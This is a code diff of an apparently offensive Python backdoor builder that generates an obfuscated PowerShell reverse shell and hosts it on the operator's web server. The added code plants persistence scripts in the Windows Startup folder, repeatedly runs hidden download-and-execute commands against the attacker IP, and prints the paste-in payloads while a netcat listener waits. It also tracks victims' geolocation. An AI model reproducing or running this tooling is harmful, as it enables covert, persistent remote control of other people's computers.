@@ -14,6 +14,7 @@ def banner():
     print("▕     ╲╲  ╱ _  ╲╲    ▕ ▏   ▏ ▏▏ ▕     ╲╲  ▕    o ▏▏     ▏   ▏▏")
     print("▕     ╱╱ ╱ ╱_̲╲  ╲╲   ▕ ▏_̲ ╱ ╱╱  ▕     ╱╱  ▕      ▏▏     ▏   ▏▏")
     print("▕_̲ _̲ ╱╱ ╱        ╲╲  ▕_____╱╱   ▕____╱╱   ▕______▏▏     ▏_̲ _▏▏\n")
+    
 
 # Commands
 def generate_bd():
@@ -32,26 +33,34 @@ def generate_bd():
                 ip = value[9:][:12].split(".")
 
     if osT == "windows" or osT == "win":
+        
         system = "Windows"
 
         port = r.randint(1000,65534)
-        payload = '$RIh2YMeUrLleflu = & (("bkJFpDG8iOerRVvo9xzsfjABHPgI5WYq4-$(0+6)h3ynN1aTEKXudm27LQlwtMCc0SUZ")[$(0-0+0-39+39+39),$(0-0+0+10),$(54),$(0-0+33),$(0+0+0-0+0-9+9+9),$(0+0+0),21,$(0-0+0+10),$($(58)),(55)] -join'+" '') $([char]($(0+6)*$(83)/$(0+6))+[char]($(46+46+0-0-46)+$(121+121+0+0-121)-$(46+46+0-0-46))+[char]($(0-0+0-0-102+102+102)*$(0-0+0+115)/$(0-0+0-0-102+102+102))+[char]($(0+0+0)+$(116)-$(0+0+0))+[char]($(0+0-0-0+3)+(((101)))-$(0+0-0-0+3))+[char]($(((28)))*(109)/$(((28))))+[char]($(1)*$(46+46+0-0-46)/$(1))+[char]($(0+0+0)+$(0-0+0-0-0+78)-$(0+0+0))+[char]($(0+0+0+19)+(((101)))-$(0+0+0+19))+[char](118+$(116)-118)+[char]($(0-0+0-39+39+39)*$(46+46+0-0-46)/$(0-0+0-39+39+39))+[char]($(0+0+0)+$(83)-$(0+0+0))+[char]($(15+15+0+0+0+0-15)*$((111))/$(15+15+0+0+0+0-15))+[char]($(11)*$(0+0+0+99)/$(11))+[char]($(0+0+0)+$(0+0-107+107+107)-$(0+0+0))+[char](24+(((101)))-24)+[char]($((75))*$(116)/$((75)))+[char]($(60)*$(0-0+0+115)/$(60))+[char]($(0+0+0)+$(46+46+0-0-46)-$(0+0+0))+[char]($(0+0+0)+84-$(0+0+0))+[char]($(0+0+0)+$($($(67)))-$(0+0+0))+[char]($($(100))+80-$($(100)))+[char]($(0-0-0-5+5+5)+$($($(67)))-$(0-0-0-5+5+5))+[char]($(0+0+0+19)*$(108)/$(0+0+0+19))+[char]($(94+94+0-0+0-94)+(($(105)))-$(94+94+0-0+0-94))+[char]($(0+0+0+0+113)+(((101)))-$(0+0+0+0+113))+[char]($(108)+110-$(108))+[char]($(0+0+0)+$(116)-$(0+0+0)))"+'("Eztpe9HAJhx0CsSoVdQai.inkFe35GxjHEZugbD17Ur.fLgCcGp4z.H2RDbaXwLSUzI46Oo8xA".replace'+"('fLgCcGp4z',"+ip[2]+").replace('Eztpe9HAJhx0CsSoVdQai',"+ip[0]+").replace('inkFe35GxjHEZugbD17Ur',"+ip[1]+").replace('H2RDbaXwLSUzI46Oo8xA',"+ip[3]+"),"+str(port)+");$VQzo0MZvYst = (& ("+'("Kq6lEhs17kBIGeSjvXwAr4cYnfT5WLPRxOyZQd8U-b9omziMCgu3J0FpVaHDN2t")[$(46+46+0-0-46),24,$(0-0+0+16),$(43),$(0+0+0-0+0-9+9+9),(13),(($(40))),(13),$(32+32+0+0-32),(55),$(20),(13),$(0+6),$(0+6),$(46+46+0-0-46),$(43),24] -join'+" '') ([string]::join('', ( (36,$(82),73,$(104),(((50))),$(0+0+89),$(77),(((101))),(($(85))),$(0+0-0+114),$(0-0+76),$(108),(((101))),$(0-0+0-0-102+102+102),$(108),$(117+117+0+0-0+0-117),$(46+46+0-0-46),$(71),(((101))),$(116),$(83),$(116),$(0+0-0+114),(((101))),$((97)),(109),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_}));[byte[]]$aKydB9RXv2thuU = $(0+0+0)..$($($(65535)))|<##>%{<#$(0+0-0-0+3)GT4BWEX1Kon2#>$_}|& ("+'("NAMCqn9H23mOzfrZeP461KyWULshapxR-jIJviEo0kQtFDlGwuST7dBcVbYg8X5")[(44),$(0-0+0-39+39+39),$(14),(((38))),$(((28))),(55),$(27+27+0+0+0-27),$(32+32+0+0-32),$(11),($((57))),$(0-0+33),$(0-0+0+16),(55),$(43)] -join'+" ''){$(0+0+0)};while(($cvB4PPcLVI = $VQzo0MZvYst.Read($aKydB9RXv2thuU, $(0+0+0), $aKydB9RXv2thuU.Length)) -ne $(0+0+0)){;$WcDamZqInJS7HDr3 = (& ("+'("bkJFpDG8iOerRVvo9xzsfjABHPgI5WYq4-$(0+6)h3ynN1aTEKXudm27LQlwtMCc0SUZ")[$(0-0+0-39+39+39),$(0-0+0+10),$(54),$(0-0+33),$(0+0+0-0+0-9+9+9),$(0+0+0),21,$(0-0+0+10),$($(58)),(55)] -join'+" '') -TypeName $([char]($(116)+$(83)-$(116))+[char]($(0+0+0)+$(121+121+0+0-121)-$(0+0+0))+[char]((($(85)))*$(0-0+0+115)/(($(85))))+[char]($(0+0+52)+$(116)-$(0+0+52))+[char]($(43)+(((101)))-$(43))+[char]($(14)+(109)-$(14))+[char](24+$(46+46+0-0-46)-24)+[char]($(0+0+0)+84-$(0+0+0))+[char]($(0+0+0)+(((101)))-$(0+0+0))+[char]($(0+0+0)+$(0-120+120+120)-$(0+0+0))+[char](24+$(116)-24)+[char](($((57)))+$(46+46+0-0-46)-($((57))))+[char]($(0+0+0)+((65))-$(0+0+0))+[char]($(121+121+0+0-121)+$(83)-$(121+121+0+0-121))+[char]($(0+0+0)+$($($(67)))-$(0+0+0))+[char]($(0+0-0+47)*73/$(0+0-0+47))+[char]($((75))+73-$((75)))+[char]($(0+0-0-0+3)*69/$(0+0-0-0+3))+[char]($(0+0-0-0+3)*110/$(0+0-0-0+3))+[char]($(0+0+0)+$(0+0+0+99)-$(0+0+0))+[char]($(94+94+0-0+0-94)*$((111))/$(94+94+0-0+0-94))+[char]((109)*$($(100))/(109))+[char]($(0+0+0)+(($(105)))-$(0+0+0))+[char](((61))+110-((61)))+[char]($(23+23+0+0+0-0-23)+$(0+0-0+0-103+103+103)-$(23+23+0+0+0-0-23)))).GetString($aKydB9RXv2thuU,$(0+0+0), $cvB4PPcLVI);$FP8DpgPcK0IovuDHPZ4p = (& ("+'("jc79lahBD50zmLSoGOAWJ6bEVTCZn-gfHRqQIs83k1KMyvYi2UPxdwFrptueX4N")[36,$(((28))),$(($(45))),$(15+15+0+0+0+0-15),(($(40))),$(0+0-0-0+59),$(29),$(23+23+0+0+0-0-23),($(51)),($($(56))),(55),$(0+0-0-0+59),$((37)),$((37)),$(0+0-0+47),$(15+15+0+0+0+0-15),$(((28)))] -join'+" '') $WcDamZqInJS7HDr3 2>&1 |<##>%{<#c8jKdSaJDXH#>$_}| & ("+'("r2-$(0-0-0-5+5+5)kGjMq4wbPSpReXc3861oBCfYULI0nEhaTvylDxHWuzVJsA79igmtNKdFOQZ")[$(60),(44),(55),$(0-0+2),(13),(55),$(0+0+0),$(0+0+52),$(32+32+0+0-32),$(53+53+0-53)] -join'+" '') );$FP8DpgPcK0IovuDHPZ4p2 = $FP8DpgPcK0IovuDHPZ4p + 'P'+'S'+' ' + (& ("+'("Xm965ksBJzH0P4Tx3fq-uV2YDWvw1pGA8OQdEoUiZyIKRbL7tMjNnerlacgCFhS")[$($(30)),$(53+53+0-53),$(0+48),$(0+0+0+19),$(46+46+0-0-46),$((37)),($((57))),($($(56))),$(0+48),$(0-0+0-39+39+39),$((37)),$(0+0+52)] -join'+" '')).Path + $('>'+' ');$6j = ([text.encoding]::ASCII).GetBytes($FP8DpgPcK0IovuDHPZ4p2);$VQzo0MZvYst.Write($6j,$(0+0+0),$6j.Length);& ("+'("kOlASeNV-$(0+0+0-0+0-9+9+9)oIy0izxUGYCWLq1Bm7EuH3dK6rjPc8shnJMtwQR45XTpbfDFaZ2gv")[$(14),$(0+0-0-0+0-42+42+42),$(0+0+0+62),$(0-0+0+10),$(0+0+0),$(0-0-0-5+5+5),(8),$(0-0-0-5+5+5),$(0-0+0+16),$(53+53+0-53),35,$(0-0-0-5+5+5),(($(40))),(($(40))),$(14),$(0-0+0+10),$(0+0-0-0+0-42+42+42)] -join'+" '') ([string]::join('', ( (36,$(86),$(81+81+0+0-81),$(122),$((111)),$(0+48),$(77),$(((90))),118,$(0+0+89),$(0-0+0+115),$(116),$(46+46+0-0-46),$($(70)),$(108),$(117+117+0+0-0+0-117),$(0-0+0+115),$(104),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_})};& ("+'("$(0-0-0-5+5+5)h7KWXyczN0sentgPElZ-QviSjuR9L1mdf3pDVTUo8Gqk4CYrHxBA2baIw6MFOJ")[$(23+23+0+0+0-0-23),(13),$($($(22))),(($(40))),(44),12,$(20),12,(((50))),35,$(0+48),12,$(11),$(11),$(23+23+0+0+0-0-23),(($(40))),(13)] -join'+" '') ([string]::join('', ( (36,$(82),73,$(104),(((50))),$(0+0+89),$(77),(((101))),(($(85))),$(0+0-0+114),$(0-0+76),$(108),(((101))),$(0-0+0-0-102+102+102),$(108),$(117+117+0+0-0+0-117),$(46+46+0-0-46),$($($(67))),$(108),$((111)),$(0-0+0+115),(((101))),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_})"
         id=make_id()
-        tempPayload = "function loop {\n    powershell -W hidden -c IEX(New-Object Net.WebClient).downloadString('http://192.168.0.26/b4dboy/"+id+"/ps.ps1')\n    Start-Sleep -Seconds 300\n    loop\n}\nloop"
         os.system(f'mkdir -p /var/www/html/b4dboy/{id}')
-        with open(f"/var/www/html/b4dboy/{id}/ps.ps1","w") as bdF:
-            bdF.write(payload)
-        bdF.close()
-        os.system(f'echo "{tempPayload}" > /var/www/html/b4dboy/{id}/temp.ps1')
+        payload = '$RIh2YMeUrLleflu = & (("bkJFpDG8iOerRVvo9xzsfjABHPgI5WYq4-$(0+6)h3ynN1aTEKXudm27LQlwtMCc0SUZ")[$(0-0+0-39+39+39),$(0-0+0+10),$(54),$(0-0+33),$(0+0+0-0+0-9+9+9),$(0+0+0),21,$(0-0+0+10),$($(58)),(55)] -join'+" '') $([char]($(0+6)*$(83)/$(0+6))+[char]($(46+46+0-0-46)+$(121+121+0+0-121)-$(46+46+0-0-46))+[char]($(0-0+0-0-102+102+102)*$(0-0+0+115)/$(0-0+0-0-102+102+102))+[char]($(0+0+0)+$(116)-$(0+0+0))+[char]($(0+0-0-0+3)+(((101)))-$(0+0-0-0+3))+[char]($(((28)))*(109)/$(((28))))+[char]($(1)*$(46+46+0-0-46)/$(1))+[char]($(0+0+0)+$(0-0+0-0-0+78)-$(0+0+0))+[char]($(0+0+0+19)+(((101)))-$(0+0+0+19))+[char](118+$(116)-118)+[char]($(0-0+0-39+39+39)*$(46+46+0-0-46)/$(0-0+0-39+39+39))+[char]($(0+0+0)+$(83)-$(0+0+0))+[char]($(15+15+0+0+0+0-15)*$((111))/$(15+15+0+0+0+0-15))+[char]($(11)*$(0+0+0+99)/$(11))+[char]($(0+0+0)+$(0+0-107+107+107)-$(0+0+0))+[char](24+(((101)))-24)+[char]($((75))*$(116)/$((75)))+[char]($(60)*$(0-0+0+115)/$(60))+[char]($(0+0+0)+$(46+46+0-0-46)-$(0+0+0))+[char]($(0+0+0)+84-$(0+0+0))+[char]($(0+0+0)+$($($(67)))-$(0+0+0))+[char]($($(100))+80-$($(100)))+[char]($(0-0-0-5+5+5)+$($($(67)))-$(0-0-0-5+5+5))+[char]($(0+0+0+19)*$(108)/$(0+0+0+19))+[char]($(94+94+0-0+0-94)+(($(105)))-$(94+94+0-0+0-94))+[char]($(0+0+0+0+113)+(((101)))-$(0+0+0+0+113))+[char]($(108)+110-$(108))+[char]($(0+0+0)+$(116)-$(0+0+0)))"+'("Eztpe9HAJhx0CsSoVdQai.inkFe35GxjHEZugbD17Ur.fLgCcGp4z.H2RDbaXwLSUzI46Oo8xA".replace'+"('fLgCcGp4z',"+ip[2]+").replace('Eztpe9HAJhx0CsSoVdQai',"+ip[0]+").replace('inkFe35GxjHEZugbD17Ur',"+ip[1]+").replace('H2RDbaXwLSUzI46Oo8xA',"+ip[3]+"),"+str(port)+");$VQzo0MZvYst = (& ("+'("Kq6lEhs17kBIGeSjvXwAr4cYnfT5WLPRxOyZQd8U-b9omziMCgu3J0FpVaHDN2t")[$(46+46+0-0-46),24,$(0-0+0+16),$(43),$(0+0+0-0+0-9+9+9),(13),(($(40))),(13),$(32+32+0+0-32),(55),$(20),(13),$(0+6),$(0+6),$(46+46+0-0-46),$(43),24] -join'+" '') ([string]::join('', ( (36,$(82),73,$(104),(((50))),$(0+0+89),$(77),(((101))),(($(85))),$(0+0-0+114),$(0-0+76),$(108),(((101))),$(0-0+0-0-102+102+102),$(108),$(117+117+0+0-0+0-117),$(46+46+0-0-46),$(71),(((101))),$(116),$(83),$(116),$(0+0-0+114),(((101))),$((97)),(109),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_}));[byte[]]$aKydB9RXv2thuU = $(0+0+0)..$($($(65535)))|<##>%{<#$(0+0-0-0+3)GT4BWEX1Kon2#>$_}|& ("+'("NAMCqn9H23mOzfrZeP461KyWULshapxR-jIJviEo0kQtFDlGwuST7dBcVbYg8X5")[(44),$(0-0+0-39+39+39),$(14),(((38))),$(((28))),(55),$(27+27+0+0+0-27),$(32+32+0+0-32),$(11),($((57))),$(0-0+33),$(0-0+0+16),(55),$(43)] -join'+" ''){$(0+0+0)};while(($cvB4PPcLVI = $VQzo0MZvYst.Read($aKydB9RXv2thuU, $(0+0+0), $aKydB9RXv2thuU.Length)) -ne $(0+0+0)){;$WcDamZqInJS7HDr3 = (& ("+'("bkJFpDG8iOerRVvo9xzsfjABHPgI5WYq4-$(0+6)h3ynN1aTEKXudm27LQlwtMCc0SUZ")[$(0-0+0-39+39+39),$(0-0+0+10),$(54),$(0-0+33),$(0+0+0-0+0-9+9+9),$(0+0+0),21,$(0-0+0+10),$($(58)),(55)] -join'+" '') -TypeName $([char]($(116)+$(83)-$(116))+[char]($(0+0+0)+$(121+121+0+0-121)-$(0+0+0))+[char]((($(85)))*$(0-0+0+115)/(($(85))))+[char]($(0+0+52)+$(116)-$(0+0+52))+[char]($(43)+(((101)))-$(43))+[char]($(14)+(109)-$(14))+[char](24+$(46+46+0-0-46)-24)+[char]($(0+0+0)+84-$(0+0+0))+[char]($(0+0+0)+(((101)))-$(0+0+0))+[char]($(0+0+0)+$(0-120+120+120)-$(0+0+0))+[char](24+$(116)-24)+[char](($((57)))+$(46+46+0-0-46)-($((57))))+[char]($(0+0+0)+((65))-$(0+0+0))+[char]($(121+121+0+0-121)+$(83)-$(121+121+0+0-121))+[char]($(0+0+0)+$($($(67)))-$(0+0+0))+[char]($(0+0-0+47)*73/$(0+0-0+47))+[char]($((75))+73-$((75)))+[char]($(0+0-0-0+3)*69/$(0+0-0-0+3))+[char]($(0+0-0-0+3)*110/$(0+0-0-0+3))+[char]($(0+0+0)+$(0+0+0+99)-$(0+0+0))+[char]($(94+94+0-0+0-94)*$((111))/$(94+94+0-0+0-94))+[char]((109)*$($(100))/(109))+[char]($(0+0+0)+(($(105)))-$(0+0+0))+[char](((61))+110-((61)))+[char]($(23+23+0+0+0-0-23)+$(0+0-0+0-103+103+103)-$(23+23+0+0+0-0-23)))).GetString($aKydB9RXv2thuU,$(0+0+0), $cvB4PPcLVI);$FP8DpgPcK0IovuDHPZ4p = (& ("+'("jc79lahBD50zmLSoGOAWJ6bEVTCZn-gfHRqQIs83k1KMyvYi2UPxdwFrptueX4N")[36,$(((28))),$(($(45))),$(15+15+0+0+0+0-15),(($(40))),$(0+0-0-0+59),$(29),$(23+23+0+0+0-0-23),($(51)),($($(56))),(55),$(0+0-0-0+59),$((37)),$((37)),$(0+0-0+47),$(15+15+0+0+0+0-15),$(((28)))] -join'+" '') $WcDamZqInJS7HDr3 2>&1 |<##>%{<#c8jKdSaJDXH#>$_}| & ("+'("r2-$(0-0-0-5+5+5)kGjMq4wbPSpReXc3861oBCfYULI0nEhaTvylDxHWuzVJsA79igmtNKdFOQZ")[$(60),(44),(55),$(0-0+2),(13),(55),$(0+0+0),$(0+0+52),$(32+32+0+0-32),$(53+53+0-53)] -join'+" '') );$FP8DpgPcK0IovuDHPZ4p2 = $FP8DpgPcK0IovuDHPZ4p + 'P'+'S'+' ' + (& ("+'("Xm965ksBJzH0P4Tx3fq-uV2YDWvw1pGA8OQdEoUiZyIKRbL7tMjNnerlacgCFhS")[$($(30)),$(53+53+0-53),$(0+48),$(0+0+0+19),$(46+46+0-0-46),$((37)),($((57))),($($(56))),$(0+48),$(0-0+0-39+39+39),$((37)),$(0+0+52)] -join'+" '')).Path + $('>'+' ');$6j = ([text.encoding]::ASCII).GetBytes($FP8DpgPcK0IovuDHPZ4p2);$VQzo0MZvYst.Write($6j,$(0+0+0),$6j.Length);& ("+'("kOlASeNV-$(0+0+0-0+0-9+9+9)oIy0izxUGYCWLq1Bm7EuH3dK6rjPc8shnJMtwQR45XTpbfDFaZ2gv")[$(14),$(0+0-0-0+0-42+42+42),$(0+0+0+62),$(0-0+0+10),$(0+0+0),$(0-0-0-5+5+5),(8),$(0-0-0-5+5+5),$(0-0+0+16),$(53+53+0-53),35,$(0-0-0-5+5+5),(($(40))),(($(40))),$(14),$(0-0+0+10),$(0+0-0-0+0-42+42+42)] -join'+" '') ([string]::join('', ( (36,$(86),$(81+81+0+0-81),$(122),$((111)),$(0+48),$(77),$(((90))),118,$(0+0+89),$(0-0+0+115),$(116),$(46+46+0-0-46),$($(70)),$(108),$(117+117+0+0-0+0-117),$(0-0+0+115),$(104),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_})};& ("+'("$(0-0-0-5+5+5)h7KWXyczN0sentgPElZ-QviSjuR9L1mdf3pDVTUo8Gqk4CYrHxBA2baIw6MFOJ")[$(23+23+0+0+0-0-23),(13),$($($(22))),(($(40))),(44),12,$(20),12,(((50))),35,$(0+48),12,$(11),$(11),$(23+23+0+0+0-0-23),(($(40))),(13)] -join'+" '') ([string]::join('', ( (36,$(82),73,$(104),(((50))),$(0+0+89),$(77),(((101))),(($(85))),$(0+0-0+114),$(0-0+76),$(108),(((101))),$(0-0+0-0-102+102+102),$(108),$(117+117+0+0-0+0-117),$(46+46+0-0-46),$($($(67))),$(108),$((111)),$(0-0+0+115),(((101))),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_})"
         
+        with open(f"/var/www/html/b4dboy/{id}/ps.ps1","w") as bdF: bdF.write(payload); bdF.close()  # Primary payload Maker
+
+        tempPayload = 'function loop {\n    powershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/ps.ps1'"+')"\n    Start-Sleep -Seconds 30\n    loop\n}\nloop'
+        os.system("echo "+'"IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')" '+"> /var/www/html/b4dboy/"+id+"/evoke.txt")  # Payload executed on Startup (Evoke.txt) Maker
+        with open(f"/var/www/html/b4dboy/{id}/temp.ps1","w") as tpF: tpF.write(tempPayload); tpF.close()  # Loop request (temp.ps1) Maker
+        with open(f"/var/www/html/b4dboy/{id}/Bb.ps1", "w") as BbF: BbF.write("powershell -c (Get-Content -path ..\evoke.txt)"); BbF.close()  # Executer on startup (Bb.ps1) Maker
+        with open(f"/var/www/html/b4dboy/{id}/infect.ps1", "w") as ifc:
+            ifc.write("cd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/evoke.txt > evoke.txt")
+            ifc.write("\ncd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs\Startup; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/Bb.ps1 > Bb.ps1")
+            ifc.write('\npowershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')"')
+        ifc.close()
+                
         payloadS = 'powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/ps.ps1')"+'"'
-        payloadT = 'powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1')"+'"'
+        payloadT = 'powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/infect.ps1')"+'"'
 
         ip = f"{ip[0]}.{ip[1]}.{ip[2]}.{ip[3]}"
         if timer == "start":
             print("\nPayload for Powershell : "+payloadS+"\n Waiting for connection on port : "+str(port)); os.system('netcat -lp '+str(port)); del_ver = input("you want del session?[Y/n]")
             if del_ver != "n" and del_ver != "N": os.system(f'rm -rf /var/www/html/b4dboy/{id}')
-        elif timer == "store": print("\nPayload for Powershell : "+payloadT+"\n(for listen : start -s="+id+")"); store_session(id, system, get_ip(ip), str(port), "", "")
+        elif timer == "store": print("\nPayload for Powershell : "+payloadT+"\n(for listen : start -s="+id+")"); input("[!] Press enter for start scanning (just )"); store_session(id, system, get_ip(ip), str(port), "", "")
         else: print("\nPayload for Powershell (listen just after execution) : "+payloadS+"\nPayload for Powershell (store session) : "+payloadT+"\n(for listen in case of store session : start -s="+id+")"); store_session(id, system, get_ip(ip), str(port), "", "")
     
     elif osT == "linux":
@@ -108,32 +117,7 @@ def mod_log():
         elif "-c" in arg:
             with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close(); os.system('clear'); banner()
             print("[+] Data deleted successfully. ")
-        elif "-gm" in arg:
-            if "--geo-mod" in arg: id = arg.split(arg[9])[1]
-            else: id = arg.split(arg[3])[1]
-            for pars in range(2, len(args)):
-                if ":" in args[pars]: field = args[pars].split(":")[0]; value = args[pars].split(":")[1]
-                elif "=" in args[pars]: field = args[pars].split("=")[0]; value = args[pars].split("=")[1]
-                else : print("[-] Unexpected value in : "+args[pars])
-                with open("logs/geo.json", "r") as geoF:
-                    oldData = geoF.read()
-                geoF.close()
-                oldData = oldData.replace("[","").replace("]","").replace(",{",",{{").replace("\n","").split(",{")
-                for sess in oldData:
-                    sess = json.loads(sess)
-                    if sess["sess_id"] == id: session = sess
-                remove_geo(id)
-                with open("logs/geo.json", "r") as geoF: old = geoF.read()[:-1]; geoF.close()
-                with open("logs/geo.json", "w") as geoF: 
-                    geoF.write(old)
-                    if field == "country": geoF.write(',{\n    "sess_id":"'+session["sess_id"]+'",\n    "country":"'+value+'",\n    "iso":"'+session["iso"]+'",\n    "latitude":"'+session["latitude"]+'",\n    "longitude":"'+session["longitude"]+'"\n}\n]')
-                    elif field == "iso": geoF.write(',{\n    "sess_id":"'+session["sess_id"]+'",\n    "country":"'+session["country"]+'",\n    "iso":"'+value+'",\n    "latitude":"'+session["latitude"]+'",\n    "longitude":"'+session["longitude"]+'"\n}\n]')
-                    elif field == "latitude": geoF.write(',{\n    "sess_id":"'+session["sess_id"]+'",\n    "country":"'+session["country"]+'",\n    "iso":"'+session["iso"]+'",\n    "latitude":"'+value+'",\n    "longitude":"'+session["longitude"]+'"\n}\n]')
-                    elif field == "longitude": geoF.write(',{\n    "sess_id":"'+session["sess_id"]+'",\n    "country":"'+session["country"]+'",\n    "iso":"'+session["iso"]+'",\n    "latitude":"'+session["latitude"]+'",\n    "longitude":"'+value+'"\n}\n]')
-                    os.system('clear')
-                    banner()
-                    print(f"[+] {field} updated successfully")
-        elif "-g" in arg:
+        elif "-gc" in arg:
             if "--geo" in arg: id = arg.split(arg[5])[1]
             else: id = arg.split(arg[3])[1]
             pars = args[args.index(arg)+1]
@@ -145,6 +129,38 @@ def mod_log():
                 with open("logs/geo.json", "w") as geoF: geoF.write(dato[:-1]+',{\n    "sess_id":"'+id+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
             else : 
                 with open("logs/geo.json", "w") as geoF: geoF.write('[\n{\n    "sess_id":"'+id+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
+        elif "-gm" in arg:
+            if "--geo-mod" in arg: id = arg.split(arg[9])[1]
+            else: id = arg.split(arg[3])[1]
+            for pars in range(2, len(args)):
+                if ":" in args[pars]: field = args[pars].split(":")[0]; value = args[pars].split(":")[1]
+                elif "=" in args[pars]: field = args[pars].split("=")[0]; value = args[pars].split("=")[1]
+                else : print("[-] Unexpected value in : "+args[pars])
+                with open("logs/geo.json", "r") as geoF:
+                    oldData = geoF.read() 
+                    sessData = oldData
+                    lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
+                    sessData = []
+                    for arg in lista:
+                        print(arg)
+                        print(type(arg))
+                        print(sessData)
+                        #sessData.append(json.loads(arg))
+                    for sess in sessData:
+                        if sess['sess_id'] == id:
+                            remove_geo(id)
+                            if field == "country": 
+                                with open("logs/geo.json", "w") as geof: geof.write(oldData[:-1]+'\n,\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+value+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n]')
+                            elif field == "iso": 
+                                with open("logs/geo.json", "w") as geof: geof.write(oldData[:-1]+'\n,\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+value+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n]')
+                            elif field == "latitude": 
+                                with open("logs/geo.json", "w") as geof: geof.write(oldData[:-1]+'\n,\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+value+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n]')
+                            elif field == "longitude": 
+                                with open("logs/geo.json", "w") as geof: geof.write(oldData[:-1]+'\n,\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+value+'"\n}\n]')
+                            else: print("[-] Err : field on geo data don´t exist. Please read the README.md for more info.")
+                        os.system('clear')
+                        banner()
+                        print(f"[+] {field} updated successfully")
 
 def start_ses():
     ses = ""
@@ -196,15 +212,7 @@ def show_info():
                 print("[-] Err : No sessions stored.")
         sesF.close()
     elif action[1] == "-g" or action[1] == "--geo":
-        with open("logs/geo.json", "r") as geoF: geoData = geoF.read(); geoF.close()
-        if geoData != "":
-            geoData = geoData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
-            print("Session ID          Country          ISO3      Latitude      Longitude")
-            print("- - - - - - -       - - - - - -      - - -     - - - - -     - - - - -")
-            for data in geoData:
-                data = json.loads(data)
-                print(f'{data["sess_id"]}             {data["country"]}            {data["iso"]}     {data["latitude"]}      {data["longitude"]}')
-        else: print("[-] Err : No Geo sessions stored.")
+        print("[-] Geolocalization will be available soon")
     elif action[1] == "-c" or action[1] == "--config":
         print("Config Values :")
         print("Interface : "+config["interface"])
@@ -222,22 +230,19 @@ def mod_config():
         if "-i" in arg:
             if "--interface" in arg: interface = arg.split(arg[11])[1]
             else: interface = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+interface+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
-        elif "--path" in arg:
-            path = arg.split(arg[6])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+path+'"\n}'); confF.close()
-        elif "-p" in arg:
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+interface+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'"\n}'); confF.close()
+        if "-p" in arg:
             if "--packages" in arg: packages = arg.split(arg[10])[1]
             else: packages = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+packages+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
-        elif "-t" in arg:
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+packages+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'"\n}'); confF.close()
+        if "-t" in arg:
             if "--token" in arg: token = arg.split(arg[7])[1]
             else: token = arg.split(arg[2])[1]
